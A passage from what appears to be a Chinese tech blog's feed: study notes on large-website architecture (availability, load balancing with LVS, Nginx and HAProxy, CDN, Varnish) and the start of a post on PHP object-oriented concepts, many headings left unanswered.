&lt;h1 id=&quot;大型网站的特点&quot;&gt;大型网站的特点&lt;/h1&gt;

&lt;h2 id=&quot;什么样的网站才算是大型网站&quot;&gt;什么样的网站才算是大型网站？&lt;/h2&gt;

&lt;p&gt;大型网站的特点：高并发，大流量，高可用，海量数据等&lt;/p&gt;

&lt;h2 id=&quot;什么是pvuv和ip呢&quot;&gt;什么是PV，UV和IP呢？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;PV(访问量)：Page View, 即页面浏览量或点击量，用户每次刷新即被计算一次。&lt;/li&gt;
  &lt;li&gt;UV(独立访客)：Unique Visitor,访问您网站的一台电脑客户端为一个访客。00:00-24:00内相同的客户端只会被计算一次。&lt;/li&gt;
  &lt;li&gt;IP(独立IP)：指独立IP数。00:00-24:00内相同IP地址之被计算一次。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;高并发是什么意思如何定义高并发呢&quot;&gt;高并发是什么意思，如何定义高并发呢？&lt;/h2&gt;

&lt;h2 id=&quot;什么是高可用&quot;&gt;什么是高可用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;高可用性（英语：High availability，缩写为 HA），IT术语，是系统的一种特性，代表系统的可用性程度。其度量方式，是根据系统损害、无法使用的时间，以及由无法运作回复到可运作状况的时间，与系统总运作时间的比较。高可用性是进行系统设计时的准则之一。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;可用性（Ao） = 总体时间 - 无法运作时间（total time - down time） / 总体时间（total time）&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;大型网站和小型网站比较有哪些不同&quot;&gt;大型网站和小型网站比较有哪些不同？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;大型网站核心架构要素&quot;&gt;大型网站核心架构要素&lt;/h1&gt;

&lt;h2 id=&quot;大型网站核心架构要素是什么&quot;&gt;大型网站核心架构要素是什么？&lt;/h2&gt;

&lt;ol&gt;
  &lt;li&gt;性能&lt;/li&gt;
  &lt;li&gt;可用性&lt;/li&gt;
  &lt;li&gt;伸缩性&lt;/li&gt;
  &lt;li&gt;扩展性&lt;/li&gt;
  &lt;li&gt;安全性&lt;/li&gt;
&lt;/ol&gt;

&lt;h2 id=&quot;打开一个网站的正常响应时间是多久呢&quot;&gt;打开一个网站的正常响应时间是多久呢？&lt;/h2&gt;

&lt;p&gt;DNS域名解析-&amp;gt;建立连接-&amp;gt;服务器计算-&amp;gt;下载内容&lt;/p&gt;

&lt;p&gt;响应时间2/5/10原则&lt;br /&gt;
当用户在2-5秒之间得到响应时，会感觉系统的响应速度还可以；当用户在5-10秒以内得到响应时，会感觉系统的响应速度很慢，但是还可以接受；而当用户在超过10秒后仍然无法得到响应时，会感觉系统糟透了，或者认为系统已经失去响应，而选择离开这个Web站点，或者发起第二次请求。&lt;/p&gt;

&lt;h2 id=&quot;从数据库中查询一条记录的正常时间是多久&quot;&gt;从数据库中查询一条记录的正常时间是多久？&lt;/h2&gt;

&lt;p&gt;低于100ms&lt;/p&gt;

&lt;h2 id=&quot;如何计算系统的最佳性能运行点&quot;&gt;如何计算系统的最佳性能运行点？&lt;/h2&gt;

&lt;h2 id=&quot;如何进行系统性能测试如何编写性能测试报告&quot;&gt;如何进行系统性能测试？如何编写性能测试报告？&lt;/h2&gt;

&lt;h2 id=&quot;常见的性能测试工具有哪些如何选择&quot;&gt;常见的性能测试工具有哪些？如何选择？&lt;/h2&gt;

&lt;p&gt;Siege -Siege（英文意思是围攻）是一个压力测试和评测工具，设计用于WEB开发这评估应用在压力下的承受能力：可以根据配置对一个WEB站点进行多用户的并发访问，记录每个用户所有请求过程的相应时间，并在一定数量的并发访问下重复进行。 Siege 支持基本的认证，cookies， HTTP 和 HTTPS 协议。&lt;/p&gt;

&lt;p&gt;http_load – http_load 以并行复用的方式运行，用以测试web服务器的吞吐量与负载。但是它不同于大多数压力测试工具，它可以以一个单一的进程运行，一般不会把客户机搞死。可以可以测试HTTPS类的网站请求。&lt;/p&gt;

&lt;h2 id=&quot;大型网站为了减少http请求有哪些常见的做法&quot;&gt;大型网站为了减少HTTP请求，有哪些常见的做法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;主要可通过合并CSS，JavaScript、图片&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;css和js文件在网页中的位置如何放置是最合适的呢&quot;&gt;CSS和JS文件在网页中的位置如何放置是最合适的呢？&lt;/h2&gt;

&lt;h2 id=&quot;web前端优化有哪些常用的做法各是什么原理&quot;&gt;WEB前端优化有哪些常用的做法？各是什么原理？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;减少HTTP请求数,主要可通过合并CSS，JavaScript、图片。&lt;/li&gt;
  &lt;li&gt;使用浏览器端缓存。在某些时候，静态资源文件编写需要及时应用到客户端浏览器，这种情况下，可通过改变文件名来实现。&lt;/li&gt;
  &lt;li&gt;启用页面压缩，文本文件的压缩效率可达80%以上。&lt;/li&gt;
  &lt;li&gt;CSS放在页面最上面，JavaScript放在页面最下面&lt;/li&gt;
  &lt;li&gt;减少Cookie传输。可以考虑使用独立域名来发送Cookie等。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;影响网站高可用性的因素有哪些&quot;&gt;影响网站高可用性的因素有哪些？&lt;/h2&gt;

&lt;h2 id=&quot;网站的高可用性如何度量&quot;&gt;网站的高可用性如何度量？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;网站不可用时间（故障时间）=故障修复时间点-故障发现（报告）时间点&lt;/li&gt;
  &lt;li&gt;网站年度不可用时间=（1-网站不可用时间/年度时间）× 100%&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是网站的伸缩性&quot;&gt;什么是网站的伸缩性？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;网站系统的伸缩性架构最重要的技术手段就是使用服务器集群功能，通过不断地向集群中添加服务器来增强整个集群的处理能力。“伸”即网站的规模和服务器的规模总是在不断扩大。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;为了实现网站的伸缩性有哪些固定的模式&quot;&gt;为了实现网站的伸缩性，有哪些固定的模式？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;网站的伸缩性设计可以分成两类，一类是根据功能进行物理分离实现伸缩，一类是单一功能通过集群实现伸缩。前者是不同的服务器部署不同的服务，提供不同的 功能；后者是集群内的多台服务器部署相同的服务，提供相关的功能。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;建设大型网站的核心思想&quot;&gt;建设大型网站的核心思想&lt;/h1&gt;

&lt;h2 id=&quot;建设大型网站的核心思想有哪些&quot;&gt;建设大型网站的核心思想有哪些？&lt;/h2&gt;

&lt;h2 id=&quot;什么是水平切分什么是垂直切分&quot;&gt;什么是水平切分？什么是垂直切分？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;分层是企业应用系统中最常见的一种架构牧师，将系统在横向维度上切分成几个部分，每个部分负责一部分相对简单并比较单一的职责，然后通过上层对下层的依赖和调度组成一个完整的系统。在网站的分层架构中，常见的为3层，即应用层、服务层、数据层。应用层具体负责业务和视图的展示；服务层为应用层提供服务支持；数据库提供数据存储访问服务，如数据库、缓存、文件、搜索引擎等。分层架构是逻辑上的，在物理部署上，三层架构可以部署在同一个物理机器上，但是随着网站业务的发展，必然需要对已经分层的模块分离部署，即三层结构分别部署在不同的服务器上，是网站拥有更多的计算资源以应对越来越多的用户访问。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;如果说分层是将软件在横向方面进行切分，那么分隔就是在纵向方面对软件进行切分。网站越大，功能越复杂，服务和数据处理的种类也越多，将这些不同的功能和服务分隔开来，包装成高内聚低耦合的模块单元，不仅有助于软件的开发维护也便于不同模块的分布式部署，提高网站的并发处理能力和功能扩展能力。大型网站分隔的粒度可能会很小。比如在应用层，将不同业务进行分隔，例如将购物、论坛、搜索、广告分隔成不同的应用，有对立的团队负责，部署在不同的服务器上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;基于分层设计的系统架构带来了什么好处&quot;&gt;基于分层设计的系统架构带来了什么好处？&lt;/h2&gt;

&lt;p&gt;分层架构模式最初的目的是规划软件清晰的逻辑结构以便于开发维护，但在网站的发展过程中，分层结构对网站支持高并发向分布式方向的发展至关重要。&lt;/p&gt;

&lt;h2 id=&quot;如何分割网站中不同的业务&quot;&gt;如何分割网站中不同的业务？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;大型网站分隔的粒度可能会很小。比如在应用层，将不同业务进行分隔，例如将购物、论坛、搜索、广告分隔成不同的应用，有对立的团队负责，部署在不同的服务器上。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;分布式是什么意思有什么常见的应用场景&quot;&gt;分布式是什么意思？有什么常见的应用场景？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;对于大型网站，分层和分隔的一个主要目的是为了切分后的模块便于分布式部署，即将不同模块部署在不同的服务器上，通过远程调用协同工作。分布式意味着可以使用更多的计算机完同样的工作，计算机越多，CPU、内存、存储资源就越多，能过处理的并发访问和数据量就越大，进而能够为更多的用户提供服务。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;分布式应用和服务：将分层和分隔后的应用和服务模块分布式部署，可以改善网站性能和并发性、加快开发和发布速度、减少数据库连接资源消耗。&lt;/li&gt;
  &lt;li&gt;分布式静态资源：网站的静态资源如JS、CSS、Logo图片等资源对立分布式部署，并采用独立的域名，即人们常说的动静分离。静态资源分布式部署可以减轻应用服务器的负载压力；通过使用独立域名加快浏览器并发加载的速度。&lt;/li&gt;
  &lt;li&gt;分布式数据和存储：大型网站需要处理以P为单位的海量数据，单台计算机无法提供如此大的存储空间，这些数据库需要分布式存储。&lt;/li&gt;
  &lt;li&gt;分布式计算：目前网站普遍使用Hadoop和MapReduce分布式计算框架进行此类批处理计算，其特点是移动计算而不是移动数据，将计算程序分发到数据所在的位置以加速计算和分布式计算。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;hadoop及其mapreduce的原理是什么&quot;&gt;Hadoop及其MapReduce的原理是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;MapReduce是一种编程模式，在很大程度上借鉴了函数式语言。它主要的思想是分而治之(divideand conquer)。将一个大的问题切分成很多小的问题，然后在集群中的各个节点上执行，这既是Map过程。在Map过程结束之后，会有一个Ruduce的过程，这个过程即将所有的Map阶段产出的结果进行汇集。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是动静分离如何实现动静分离&quot;&gt;什么是动静分离？如何实现动静分离？&lt;/h2&gt;

&lt;p&gt;upstream模块，将使nginx跨越单机的限制，完成网络数据的接收、处理和转发。数据转发功能，为nginx提供了跨越单机的横向处理能力，使nginx摆脱只能为终端节点提供单一功能的限制，而使它具备了网路应用级别的拆分、封装和整合的战略功能。&lt;/p&gt;

&lt;h2 id=&quot;读写分离是什么意思常见的实现方式有哪些&quot;&gt;读写分离是什么意思？常见的实现方式有哪些？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;让主数据库（master）处理事务性增、改、删操作（INSERT、UPDATE、DELETE），而从数据库（slave）处理SELECT查询操作。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;异步消息队列有哪些应用场景&quot;&gt;异步消息队列有哪些应用场景？&lt;/h2&gt;

&lt;p&gt;常规的使用场景：短信服务、电子邮件服务、图片处理服务、好友动态推送服务等。&lt;/p&gt;

&lt;h2 id=&quot;自动化技术能帮助我们干哪些事情如何实现&quot;&gt;自动化技术能帮助我们干哪些事情？如何实现？&lt;/h2&gt;

&lt;p&gt;自动化运维
自动化部署
自动化测试&lt;/p&gt;

&lt;h2 id=&quot;如何配置高性能的linux服务器背后有什么道理&quot;&gt;如何配置高性能的Linux服务器？背后有什么道理？&lt;/h2&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;大型网站常用技术和工具&quot;&gt;大型网站常用技术和工具&lt;/h1&gt;

&lt;h2 id=&quot;如何实现负载均衡技术有那些常用的工具&quot;&gt;如何实现负载均衡技术，有那些常用的工具？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;负载平衡（Load balancing）是一种计算机网络技术，用来在多个计算机（计算机集群）、网络连接、CPU、磁盘驱动器或其他资源中分配负载，以达到最佳化资源使用、最大化吞吐率、最小化响应时间、同时避免过载的目的。使用带有负载平衡的多个服务器组件，取代单一的组件，可以通过冗余提高可靠性。负载平衡服务通常是由专用软体和硬件来完成。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;lvshaproxynginxf5等各有什么不同如何选用&quot;&gt;LVS，haproxy，nginx，F5等各有什么不同，如何选用？&lt;/h2&gt;

&lt;p&gt;&lt;strong&gt;LVS&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;抗负载能力强、是工作在网络4层之上仅作分发之用，没有流量的产生，这个特点也决定了它在负载均衡软件里的性能最强的；&lt;/li&gt;
  &lt;li&gt;配置性比较低，这是一个缺点也是一个优点，因为没有可太多配置的东西，所以并不需要太多接触，大大减少了人为出错的几率；&lt;/li&gt;
  &lt;li&gt;工作稳定，自身有完整的双机热备方案，如LVS+Keepalived和LVS+Heartbeat，不过我们在项目实施中用得最多的还是LVS/DR+Keepalived；&lt;/li&gt;
  &lt;li&gt;无流量，保证了均衡器IO的性能不会收到大流量的影响；&lt;/li&gt;
  &lt;li&gt;应用范围比较广，可以对所有应用做负载均衡；&lt;/li&gt;
  &lt;li&gt;软件本身不支持正则处理，不能做动静分离，这个就比较遗憾了；其实现在许多网站在这方面都有较强的需求，这个是Nginx/HAProxy+Keepalived的优势所在。&lt;/li&gt;
  &lt;li&gt;如果是网站应用比较庞大的话，实施LVS/DR+Keepalived起来就比较复杂了，特别后面有Windows Server应用的机器的话，如果实施及配置还有维护过程就比较复杂了，相对而言，Nginx/HAProxy+Keepalived就简单多了。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Nginx&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;工作在网络的7层之上，可以针对http应用做一些分流的策略，比如针对域名、目录结构，它的正则规则比HAProxy更为强大和灵活，这也是许多朋友喜欢它的原因之一；&lt;/li&gt;
  &lt;li&gt;Nginx对网络的依赖非常小，理论上能ping通就就能进行负载功能，这个也是它的优势所在；&lt;/li&gt;
  &lt;li&gt;Nginx安装和配置比较简单，测试起来比较方便；&lt;/li&gt;
  &lt;li&gt;也可以承担高的负载压力且稳定，一般能支撑超过几万次的并发量；&lt;/li&gt;
  &lt;li&gt;Nginx可以通过端口检测到服务器内部的故障，比如根据服务器处理网页返回的状态码、超时等等，并且会把返回错误的请求重新提交到另一个节点，不过其中缺点就是不支持url来检测；&lt;/li&gt;
  &lt;li&gt;Nginx仅能支持http和Email，这样就在适用范围上面小很多，这个它的弱势；&lt;/li&gt;
  &lt;li&gt;Nginx不仅仅是一款优秀的负载均衡器/反向代理软件，它同时也是功能强大的Web应用服务器。LNMP现在也是非常流行的web架构，大有和以前最流行的LAMP架构分庭抗争之势，在高流量的环境中也有很好的效果。&lt;/li&gt;
  &lt;li&gt;Nginx现在作为Web反向加速缓存越来越成熟了，很多朋友都已在生产环境下投入生产了，而且反映效果不错，速度比传统的Squid服务器更快，有兴趣的朋友可以考虑用其作为反向代理加速器。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;HAProxy&lt;/strong&gt;&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;HAProxy是支持虚拟主机的，以前有朋友说这个不支持虚拟主机，我这里特此更正一下。&lt;/li&gt;
  &lt;li&gt;能够补充Nginx的一些缺点比如Session的保持，Cookie的引导等工作&lt;/li&gt;
  &lt;li&gt;支持url检测后端的服务器出问题的检测会有很好的帮助。&lt;/li&gt;
  &lt;li&gt;它跟LVS一样，本身仅仅就只是一款负载均衡软件；单纯从效率上来讲HAProxy更会比Nginx有更出色的负载均衡速度，在并发处理上也是优于Nginx的。&lt;/li&gt;
  &lt;li&gt;HAProxy可以对Mysql读进行负载均衡，对后端的MySQL节点进行检测和负载均衡，不过在后端的MySQL slaves数量超过10台时性能不如LVS，所以我向大家推荐LVS+Keepalived。&lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;HAProxy的算法现在也越来越多了，具体有如下8种：&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;roundrobin，表示简单的轮询，这个不多说，这个是负载均衡基本都具备的；&lt;/li&gt;
  &lt;li&gt;static-rr，表示根据权重，建议关注；&lt;/li&gt;
  &lt;li&gt;leastconn，表示最少连接者先处理，建议关注；&lt;/li&gt;
  &lt;li&gt;ource，表示根据请求源IP，这个跟Nginx的IP_hash机制类似，我们用其作为解决session问题的一种方法，建议关注；&lt;/li&gt;
  &lt;li&gt;ri，表示根据请求的URI；&lt;/li&gt;
  &lt;li&gt;rl_param，表示根据请求的URl参数’balance url_param’ requires an URL parameter name；&lt;/li&gt;
  &lt;li&gt;hdr(name)，表示根据HTTP请求头来锁定每一次HTTP请求；&lt;/li&gt;
  &lt;li&gt;rdp-cookie(name)，表示根据据cookie(name)来锁定并哈希每一次TCP请求。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何理解tcpip七层网络协议&quot;&gt;如何理解TCP/IP七层网络协议？&lt;/h2&gt;

&lt;h2 id=&quot;负载均衡的常见算法有哪些如何选择&quot;&gt;负载均衡的常见算法有哪些，如何选择？&lt;/h2&gt;

&lt;ul&gt;
  &lt;li&gt;依序Round Robin&lt;/li&gt;
  &lt;li&gt;比重Weighted Round Robin&lt;/li&gt;
  &lt;li&gt;流量比例Traffic&lt;/li&gt;
  &lt;li&gt;使用者端User&lt;/li&gt;
  &lt;li&gt;应用类别Application&lt;/li&gt;
  &lt;li&gt;联机数量Session&lt;/li&gt;
  &lt;li&gt;服务类别Service&lt;/li&gt;
  &lt;li&gt;自动分配Auto Mode&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何配置lvs的dr模式&quot;&gt;如何配置LVS的DR模式？&lt;/h2&gt;

&lt;h2 id=&quot;如何配置haproxy的高可用&quot;&gt;如何配置haproxy的高可用？&lt;/h2&gt;

&lt;h2 id=&quot;怎样用nginx来实现负载均衡&quot;&gt;怎样用Nginx来实现负载均衡？&lt;/h2&gt;

&lt;h2 id=&quot;高可用软件keepalived的实现原理是什么&quot;&gt;高可用软件keepalived的实现原理是什么？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个LVS服务会有2台服务器运行Keepalived，一台为主服务器（MASTER），一台为备份服务器（BACKUP），但是对外表现为一个虚拟IP，主服务器会发送特定的消息给备份服务器，当备份服务器收不到这个消息的时候，即主服务器宕机的时候， 备份服务器就会接管虚拟IP，继续提供服务，从而保证了高可用性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何利用rsync技术高效的实现文件的传送和分发&quot;&gt;如何利用rsync技术高效的实现文件的传送和分发？&lt;/h2&gt;

&lt;h2 id=&quot;git的基本原理和实现方式什么&quot;&gt;git的基本原理和实现方式什么？&lt;/h2&gt;

&lt;p&gt;直接记录快照，而非差异比较
近乎所有操作都是本地执行
时刻保持数据完整性
多数操作仅添加数据
文件的三种状态&lt;/p&gt;

&lt;h2 id=&quot;如何搭建自己的git服务器&quot;&gt;如何搭建自己的git服务器？&lt;/h2&gt;

&lt;h2 id=&quot;虚拟化技术xen和kvm有什么不同如何选择&quot;&gt;虚拟化技术xen和kvm有什么不同，如何选择？&lt;/h2&gt;

&lt;h2 id=&quot;cdn技术的原理是什么为什么要用cdn&quot;&gt;CDN技术的原理是什么？为什么要用CDN？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;CDN的全称是Content Delivery Network，即内容分发网络。其基本思路是尽可能避开互联网上有可能影响数据传输速度和稳定性的瓶颈和环节，使内容传输的更快、更稳定。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;内容发布：它借助于建立索引、缓存、流分裂、组播（Multicast）等技术，将内容发布或投递到距离用户最近的远程服务点（POP）处；&lt;/li&gt;
  &lt;li&gt;内容路由：它是整体性的网络负载均衡技术，通过内容路由器中的重定向（DNS）机制，在多个远程POP上均衡用户的请求，以使用户请求得到最近内容源的响应；&lt;/li&gt;
  &lt;li&gt;内容交换：它根据内容的可用性、服务器的可用性以及用户的背景，在POP的缓存服务器上，利用应用层交换、流分裂、重定向（ICP、WCCP）等技术，智能地平衡负载流量；&lt;/li&gt;
  &lt;li&gt;性能管理：它通过内部和外部监控系统，获取网络部件的状况信息，测量内容发布的端到端性能（如包丢失、延时、平均带宽、启动时间、帧速率等），保证网络处于最佳的运行状态。&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;如何理解http加速器varnish如何运用&quot;&gt;如何理解HTTP加速器Varnish，如何运用？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;Varnish 是一款高性能且开源的反向代理服务器和 HTTP 加速器，其采用全新的软件体系机构，和现在的硬件体系紧密配合，与传统的 squid 相比，varnish 具有性能更高、速度更快、管理更加方便等诸多优点，很多大型的网站都开始尝试使用 varnish 来替换 squid，这些都促进 varnish 迅速发展起来。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;如何架构一个日均超过1000w的大型电商网站&quot;&gt;如何架构一个日均超过1000w的大型电商网站？&lt;/h2&gt;

&lt;pre&gt;&lt;code&gt;https://blog.csdn.net/he90227/article/details/50800546
&lt;/code&gt;&lt;/pre&gt;
&lt;hr /&gt;

&lt;h1 id=&quot;参考&quot;&gt;参考&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/edisonchou/p/3806348.html&quot;&gt;大型网站核心架构要素&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://blog.csdn.net/chaofanwei/article/details/26865169&quot;&gt;大型网站技术架构（一）–大型网站架构演化&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/2589.html&quot;&gt;十个免费的Web压力测试工具&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.cnblogs.com/xiaocen/p/3723839.html&quot;&gt;如何构建日均千万PV Web站点&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://tengine.taobao.org/book/chapter_05.html&quot;&gt;upstream模块&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.infoq.com/cn/articles/message-based-distributed-architecture&quot;&gt;案例分析：基于消息的分布式架构&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.infoq.com/cn/presentations/construction-of-automated-operation-and-maintenance-of-yihaodian&quot;&gt;1号店自动化运维构建&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.infoq.com/cn/news/2011/07/ci-automatic-deployment&quot;&gt;持续集成之“自动化部署”&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://coolshell.cn/articles/7657.html&quot;&gt;持续部署，并不简单！&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://tech.uc.cn/?p=887&quot;&gt;基于Func自动化部署：方案思索及演进&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://capistranorb.com/&quot;&gt;A remote server automation and deployment tool written in Ruby.&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;https://github.com/deployphp/deployer&quot;&gt;Deployment Tool on PHP http://deployer.org&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.infoq.com/cn/news/2011/07/ci-automatic-deployment&quot;&gt;持续集成之“自动化部署”&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.techug.com/linux-performance-tools&quot;&gt;三张图看遍Linux 性能监控、测试、优化工具&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://freeloda.blog.51cto.com/2033581/1280962&quot;&gt;Linux 高可用（HA）集群之keepalived详解&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://git-scm.com/book/zh/v1/%E8%B5%B7%E6%AD%A5-Git-%E5%9F%BA%E7%A1%80&quot;&gt;起步 - Git 基础&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://www.ibm.com/developerworks/cn/opensource/os-cn-varnish-intro/&quot;&gt;Varnish 入门&lt;/a&gt;&lt;br /&gt;
&lt;a href=&quot;http://502245466.blog.51cto.com/7559397/1305072&quot;&gt;varnish原理精解&lt;/a&gt;\&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>PHP高级特性</title>
   <link href="http://yanpeipan.github.io/2015/01/22/php.html"/>
   <updated>2015-01-22T00:00:00+08:00</updated>
   <id>http://yanpeipan.github.io/2015/01/22/php</id>
   <content type="html">
&lt;hr /&gt;

&lt;h1 id=&quot;面向对象基础回顾&quot;&gt;面向对象基础回顾&lt;/h1&gt;

&lt;h2 id=&quot;什么是对象什么是类两者有什么区别和联系&quot;&gt;什么是对象？什么是类？两者有什么区别和联系？&lt;/h2&gt;

&lt;p&gt;类是对一类事物描述，是抽象的、概念上的定义；&lt;br /&gt;
对象是实际存在的该类事物的每个个体，因而也称实例(instance)。在计算机中，可以理解为，在内存中创建了实实在在存在的一个内存区域存储着这个对象。&lt;br /&gt;
创建对象的过程称为创建对象，也称为实例化。&lt;/p&gt;

&lt;h2 id=&quot;什么是继承php支持怎样的继承&quot;&gt;什么是继承？PHP支持怎样的继承？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;继承（Inheritance）是面向对象软件技术当中的一个概念。继承可以使得子类别具有父类别的各种属性和方法，而不需要再次编写相同的代码。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;一个扩充类总是依赖一个单独的基类，也就是说，不支持多继承。使用关键字“extends”来扩展一个类。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是重写overridingphp是否支持重载overloading&quot;&gt;什么是重写（overriding）？PHP是否支持重载（overloading）？&lt;/h2&gt;

&lt;p&gt;Java 重写(Override)与重载(Overload)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;重写是子类对父类的允许访问的方法的实现过程进行重新编写！返回值和形参都不能改变。即外壳不变，核心重写！&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;重载(overloading) 是在一个类里面，方法名字相同，而参数不同。返回类型呢？可以相同也可以不同。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是静态方法什么情况下适合使用静态方法&quot;&gt;什么是静态方法？什么情况下适合使用静态方法？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;静态方法只要定义了类，不必建立类的实例就可使用&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;全部静态意味着牺牲了OOP的三个特性，也就意味着放弃了封装、集成、多态。另外，由于没有统一编码习惯和约定，很多东西不做抽象，不做单一入口，代码本身的复用以及维护都是个问题。写多了这种代码，估计工程师本身的成就感都是个问题。
个人理解下面这几种情景下使用static关键字会比较合适：\&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;util类(或者某个类中充当了util角色的method)&lt;/li&gt;
  &lt;li&gt;一些特殊的design pattern中，比如static factory、singleton pattern中&lt;/li&gt;
  &lt;li&gt;某项被封装的功能，即使类不实例化，也可以调用并且不觉得别扭、奇怪，不依赖类内部的其它非静态成员&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;什么是类常量什么情况下应该使用类常量&quot;&gt;什么是类常量？什么情况下应该使用类常量？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;可以把在类中始终保持不变的值定义为常量。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;常量的值必须是一个定值，不能是变量，类属性，数学运算的结果或函数调用。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;什么是抽象类什么是接口分别适用于何种场景&quot;&gt;什么是抽象类？什么是接口？分别适用于何种场景？&lt;/h2&gt;

&lt;blockquote&gt;
  &lt;p&gt;定义为抽象的类不能被实例化。任何一个类，如果它里面至少有一个方法是被声明为抽象的，那么这个类就必须被声明为抽象的。被定义为抽象的方法只是声明了其调用方式（参数），不能定义其具体的功能实现。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;使用接口（interface），可以指定某个类必须实现哪些方法，但不需要定义这些方法的具体内容。接口是通过 interface 关键字来定义的，就像定义一个标准的类一样，但其中定义所有的方法都是空的。接口中定义的所有方法都必须是公有，这是接口的特性。&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;接口没有构造函数，抽象类可以有构造函数。&lt;/li&gt;
  &lt;li&gt;接口中的方法默认都是public类型的。而抽象类中的方法可以使用private,protected或public来修饰。&lt;/li&gt;
  &lt;li&gt;一个类可以同时实现多个接口。一个类只能继承一个抽象类。&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;抽象类还是接口&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;如果要创建一个模型，这个模型将由一些紧密相关的对象采用，就可以使用抽象类。如果要创建由一些不相关对象采用的功能，就使用接口。&lt;/li&gt;
  &lt;li&gt;如果必须从多个来源继承行为，就使用接口。&lt;/li&gt;
  &lt;li&gt;如果知道所有类都会共享一个公共的行为实现，就可以使用抽象类，并在其中实现该行为。&lt;/li&gt;
